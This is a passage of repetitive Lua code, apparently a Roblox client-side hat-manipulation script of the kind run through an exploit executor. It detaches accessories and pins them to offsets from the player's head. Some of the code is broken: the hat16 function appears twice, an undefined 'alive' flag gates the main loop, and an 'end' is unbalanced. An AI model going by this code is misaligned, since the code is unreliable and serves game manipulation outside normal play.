local HAT = "12"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -22

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat13()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "13"
print(fe.Name)
local HAT = "13"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -24

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat14()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "14"
print(fe.Name)
local HAT = "14"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -26

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat15()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "15"
print(fe.Name)
local HAT = "15"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -28

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat16()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "16"
print(fe.Name)
local HAT = "16"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -30

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat16()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "16"
print(fe.Name)
local HAT = "16"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -30

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat17()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "17"
print(fe.Name)
local HAT = "17"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -32

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat18()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "18"
print(fe.Name)
local HAT = "18"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -34

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat19()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "19"
print(fe.Name)
local HAT = "19"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -36

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat20()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "20"
print(fe.Name)
local HAT = "20"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -38

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat21()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "21"
print(fe.Name)
local HAT = "21"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -40

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat22()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "22"
print(fe.Name)
local HAT = "22"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -42

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat23()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "23"
print(fe.Name)
local HAT = "23"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -44

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat24()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "24"
print(fe.Name)
local HAT = "24"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -46

XvalO.Value = 0
